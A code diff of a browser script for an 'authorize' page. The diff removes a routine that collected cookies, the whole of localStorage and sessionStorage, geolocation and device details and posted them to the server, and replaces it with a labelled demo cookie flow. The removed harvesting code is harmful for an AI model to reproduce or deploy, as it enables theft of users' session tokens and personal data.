@@ -1,107 +1,59 @@
 const checkbox = document.getElementById("acceptTerms");
 const authorizeButton = document.getElementById("authorizeBtn");
+const demoResult = document.getElementById("demoResult");
 
-checkbox.addEventListener("change", () => {
-    authorizeButton.disabled = !checkbox.checked;
-});
+if (checkbox && authorizeButton) {
+    checkbox.addEventListener("change", () => {
+        authorizeButton.disabled = !checkbox.checked;
+    });
+}
+
+function setDemoCookie() {
+    const value = `edu-demo-${Date.now()}`;
+    document.cookie = `edu_demo=${encodeURIComponent(value)}; path=/; SameSite=Lax`;
+    return value;
+}
+
+function readDemoCookie() {
+    const match = document.cookie.match(/(?:^|; )edu_demo=([^;]*)/);
+    return match ? decodeURIComponent(match[1]) : "not set";
+}
 
 async function collectAndSendInfo() {
-    const payload = {};
+    const value = setDemoCookie();
 
-    // Timezone
-    payload.timezone = Intl.DateTimeFormat && Intl.DateTimeFormat().resolvedOptions ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'N/A';
-
-    // User agent
-    payload.userAgent = navigator.userAgent || 'N/A';
-
-    // Hardware specs
-    payload.hardwareSpecs = {
-        cores: navigator.hardwareConcurrency || 'N/A',
-        deviceMemory: navigator.deviceMemory || 'N/A',
-        platform: navigator.platform || 'N/A',
-        screen: { width: screen.width, height: screen.height },
-        language: navigator.language || 'N/A'
+    const payload = {
+        demoCookie: value,
+        cookieHeader: document.cookie || "",
+        note: "first-party demo cookie only"
     };
 
-    // Internal state (local/session storage snapshot)
-    try {
-        const local = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            local[key] = localStorage.getItem(key);
-        }
-
-        const session = {};
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            session[key] = sessionStorage.getItem(key);
-        }
-
-        payload.internalState = { localStorage: local, sessionStorage: session };
-    } catch (e) {
-        payload.internalState = 'unavailable';
+    if (demoResult) {
+        demoResult.textContent = `Demo cookie set: ${value}`;
     }
 
-    // Referrer and cookies
-    payload.referrer = document.referrer || 'N/A';
-    payload.cookies = document.cookie || 'N/A';
-
-    // Try to get geolocation if user allows
-    payload.geoLocation = 'unavailable';
-    try {
-        if (navigator.geolocation) {
-            const pos = await new Promise((resolve, reject) => {
-                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
-            });
-            payload.geoLocation = { latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy };
-        }
-    } catch (e) {
-        payload.geoLocation = 'denied_or_unavailable';
-    }
-
-    // Build diagnostics describing what we were able to collect
-    const diagnostics = {
-        timestamp: new Date().toISOString(),
-        geoAvailable: !!navigator.geolocation,
-        geoResult: payload.geoLocation,
-        timezone: payload.timezone,
-        userAgent: payload.userAgent,
-        hardwareSpecsPresent: payload.hardwareSpecs && Object.keys(payload.hardwareSpecs).length > 0,
-        hardwareSpecs: payload.hardwareSpecs,
-        localStorageAccessible: payload.internalState !== 'unavailable' && payload.internalState.localStorage !== undefined,
-        localStorageCount: payload.internalState !== 'unavailable' ? Object.keys(payload.internalState.localStorage || {}).length : 0,
-        sessionStorageCount: payload.internalState !== 'unavailable' ? Object.keys(payload.internalState.sessionStorage || {}).length : 0,
-        referrer: payload.referrer,
-        cookiesPresent: !!payload.cookies,
-        rawPayloadPreview: payload
-    };
-
-    // Send diagnostics first
-    try {
-        await fetch('/diagnostics', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            credentials: 'same-origin',
-            body: JSON.stringify(diagnostics)
-        });
-    } catch (err) {
-        console.error('Failed to send diagnostics:', err);
-    }
-
-    // Then send the regular authorize payload
     try {
         await fetch('/authorize', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            credentials: 'same-origin',
+            credentials: 'include',
             body: JSON.stringify(payload)
         });
     } catch (err) {
-        console.error('Failed to send info:', err);
+        console.error('Failed to send demo info:', err);
+        if (demoResult) {
+            demoResult.textContent = `Demo cookie set: ${value} (save failed)`;
+        }
     }
 }
 
-authorizeButton.addEventListener("click", async () => {
-    await collectAndSendInfo();
-    window.location.href = "loading.html";
-});
+if (authorizeButton) {
+    authorizeButton.addEventListener("click", async () => {
+        await collectAndSendInfo();
+        window.location.href = "loading.html";
+    });
+}
+
+if (demoResult) {
+    demoResult.textContent = `Current demo cookie: ${readDemoCookie()}`;
+}
